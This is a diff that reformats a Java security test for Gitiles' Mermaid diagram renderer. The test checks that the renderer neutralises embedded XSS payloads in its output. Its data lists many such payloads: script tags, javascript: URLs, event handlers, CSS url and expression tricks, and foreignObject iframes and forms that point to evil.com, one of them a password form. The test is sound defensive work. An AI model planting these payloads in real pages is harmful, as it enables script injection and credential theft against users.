@@ -16,9 +16,11 @@ package com.google.gitiles.doc;
 
 import static com.google.common.truth.Truth.assertThat;
 
+import com.google.common.html.types.SafeHtml;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Optional;
+import org.commonmark.node.Node;
 import org.eclipse.jgit.lib.Config;
 import org.junit.Test;
 import org.junit.runner.RunWith;
@@ -66,15 +68,19 @@ public class SimpleMermaidRendererSecurityTest {
   public void testForeignObjectAndEmbeddedHtmlInLabels() {
     List<String> payloads =
         Arrays.asList(
-            "<foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject>",
+            "<foreignObject><body"
+                + " xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject>",
             "<foreignObject><iframe src=\"javascript:alert(1)\"></iframe></foreignObject>",
             "<foreignObject><iframe src=\"https://evil.com\"></iframe></foreignObject>",
-            "<foreignObject><form action=\"//evil.com\"><input type=\"password\" name=\"pass\"></form></foreignObject>",
+            "<foreignObject><form action=\"//evil.com\"><input type=\"password\""
+                + " name=\"pass\"></form></foreignObject>",
             "<foreignObject><embed src=\"evil.swf\"></embed></foreignObject>",
             "<foreignObject><object data=\"javascript:alert(1)\"></object></foreignObject>",
             "<foreignObject><audio src=\"x\" onerror=\"alert(1)\"></audio></foreignObject>",
             "<foreignObject><video src=\"x\" onerror=\"alert(1)\"></video></foreignObject>",
-            "<foreignObject width=\"100\" height=\"100\"><div xmlns=\"http://www.w3.org/1999/xhtml\"><span>HTML Content</span></div></foreignObject>");
+            "<foreignObject width=\"100\" height=\"100\"><div"
+                + " xmlns=\"http://www.w3.org/1999/xhtml\"><span>HTML"
+                + " Content</span></div></foreignObject>");
 
     for (String payload : payloads) {
       String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
@@ -149,7 +155,8 @@ public class SimpleMermaidRendererSecurityTest {
             "<animate attributeName=\"xlink:href\" values=\"javascript:alert(1)\" dur=\"1s\" />",
             "<set onbegin=\"alert('set-begin')\" attributeName=\"x\" dur=\"1s\" />",
             "<set attributeName=\"onmouseover\" to=\"alert(1)\" />",
-            "<animateTransform attributeName=\"transform\" type=\"rotate\" from=\"0\" to=\"360\" onend=\"alert(1)\" />");
+            "<animateTransform attributeName=\"transform\" type=\"rotate\" from=\"0\" to=\"360\""
+                + " onend=\"alert(1)\" />");
 
     for (String payload : payloads) {
       String code = "graph TD\n  A[\"" + payload.replace("\"", "\\\"") + "\"] --> B\n";
@@ -167,7 +174,8 @@ public class SimpleMermaidRendererSecurityTest {
         Arrays.asList(
             "<use href=\"javascript:alert(1)\" />",
             "<use xlink:href=\"javascript:alert(1)\" />",
-            "<use href=\"data:image/svg+xml;utf8,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\" />",
+            "<use href=\"data:image/svg+xml;utf8,<svg id='x'"
+                + " xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\" />",
             "<use xlink:href=\"https://evil.com/payload.svg#icon\" />",
             "<image href=\"javascript:alert(1)\" />",
             "<image xlink:href=\"javascript:alert(1)\" />",
@@ -195,7 +203,8 @@ public class SimpleMermaidRendererSecurityTest {
             "<style>body { background: url(\"javascript:alert(1)\"); }</style>",
             "<style>* { -moz-binding: url('http://evil.com/xss.xml#test'); }</style>",
             "<style>svg { behavior: url(xss.htc); }</style>",
-            "<style>@keyframes xss { from { background-image: url('javascript:alert(1)'); } } </style>",
+            "<style>@keyframes xss { from { background-image: url('javascript:alert(1)'); } }"
+                + " </style>",
             "<div style=\"fill:expression(alert(1))\">Styled Div</div>",
             "<div style=\"background-image:url(javascript:alert(1))\">Background</div>",
             "<div style=\"behavior:url(xss.htc)\">HTC Component</div>");
@@ -278,7 +287,9 @@ public class SimpleMermaidRendererSecurityTest {
     for (String payload : payloads) {
       String code =
           "graph TD\n"
-              + "  subgraph Sg [\"" + payload.replace("\"", "\\\"") + "\"]\n"
+              + "  subgraph Sg [\""
+              + payload.replace("\"", "\\\"")
+              + "\"]\n"
               + "    A[Node A]\n"
               + "  end\n"
               + "  A --> B\n";
@@ -293,16 +304,18 @@ public class SimpleMermaidRendererSecurityTest {
   @Test
   public void testMermaidDirectivesCannotInjectCode() {
     String code =
-        "graph TD\n"
-            + "  A[Node A] --> B[Node B]\n"
-            + "  click A href \"javascript:alert('click-href')\"\n"
-            + "  click B call alert('click-call')\n"
-            + "  click A \"javascript:alert('click-positional')\"\n"
-            + "  style A fill:url(javascript:alert('style-fill'))\n"
-            + "  style B stroke:url(data:image/svg+xml,<svg onload=alert(1)>)\n"
-            + "  classDef evil fill:red,stroke:url(javascript:alert(1));\n"
-            + "  class A evil\n"
-            + "  linkStyle 0 stroke:url(javascript:alert(1));\n";
+        """
+        graph TD
+          A[Node A] --> B[Node B]
+          click A href "javascript:alert('click-href')"
+          click B call alert('click-call')
+          click A "javascript:alert('click-positional')"
+          style A fill:url(javascript:alert('style-fill'))
+          style B stroke:url(data:image/svg+xml,<svg onload=alert(1)>)
+          classDef evil fill:red,stroke:url(javascript:alert(1));
+          class A evil
+          linkStyle 0 stroke:url(javascript:alert(1));
+        """;
 
     SvgDoc svg = SvgDoc.render(code);
     svg.assertNoDangerousTags();
@@ -363,23 +376,26 @@ public class SimpleMermaidRendererSecurityTest {
   @Test
   public void testEndToEndMarkdownXssPrevention() {
     String md =
-        "# Security Audit Title\n\n"
-            + "```mermaid\n"
-            + "graph TD\n"
-            + "  A[\"<script>alert('e2e-node')</script>\"]\n"
-            + "  B[\"<iframe src='javascript:alert(1)'></iframe>\"]\n"
-            + "  C[\"<img src=x onerror=alert('e2e-img')>\"]\n"
-            + "  D[\"<foreignObject><iframe src='http://evil.com'></iframe></foreignObject>\"]\n"
-            + "  A -->|\"<script>alert('e2e-edge')</script>\"| B\n"
-            + "  B --> C --> D\n"
-            + "  click A href \"javascript:alert('e2e-click')\"\n"
-            + "```\n";
+        """
+        # Security Audit Title
+
+        ```mermaid
+        graph TD
+          A["<script>alert('e2e-node')</script>"]
+          B["<iframe src='javascript:alert(1)'></iframe>"]
+          C["<img src=x onerror=alert('e2e-img')>"]
+          D["<foreignObject><iframe src='http://evil.com'></iframe></foreignObject>"]
+          A -->|"<script>alert('e2e-edge')</script>"| B
+          B --> C --> D
+          click A href "javascript:alert('e2e-click')"
+        ```
+        """;
 
     Config cfg = new Config();
     cfg.setBoolean("markdown", null, "mermaid", true);
     MarkdownConfig mc = new MarkdownConfig(cfg);
-    org.commonmark.node.Node node = GitilesMarkdown.parse(mc, md);
-    com.google.common.html.types.SafeHtml html =
+    Node node = GitilesMarkdown.parse(mc, md);
+    SafeHtml html =
         MarkdownToHtml.builder()
             .setConfig(mc)
             .setFilePath("security_test.md")
@@ -401,7 +417,8 @@ public class SimpleMermaidRendererSecurityTest {
 
     // Verify all payloads are safely encoded as XML entity text
     assertThat(htmlStr).contains("&lt;script&gt;alert(&apos;e2e-node&apos;)&lt;/script&gt;");
-    assertThat(htmlStr).contains("&lt;iframe src=&apos;javascript:alert(1)&apos;&gt;&lt;/iframe&gt;");
+    assertThat(htmlStr)
+        .contains("&lt;iframe src=&apos;javascript:alert(1)&apos;&gt;&lt;/iframe&gt;");
     assertThat(htmlStr).contains("&lt;img src=x onerror=alert(&apos;e2e-img&apos;)&gt;");
   }
 
@@ -411,7 +428,7 @@ public class SimpleMermaidRendererSecurityTest {
 
   private void assertSafeSvg(String mermaidCode, String originalPayload) {
     Optional<String> svgOpt = SimpleMermaidRenderer.renderToSvg(mermaidCode);
-    assertThat(svgOpt.isPresent()).isTrue();
+    assertThat(svgOpt).isPresent();
 
     String rawSvg = svgOpt.get();
 
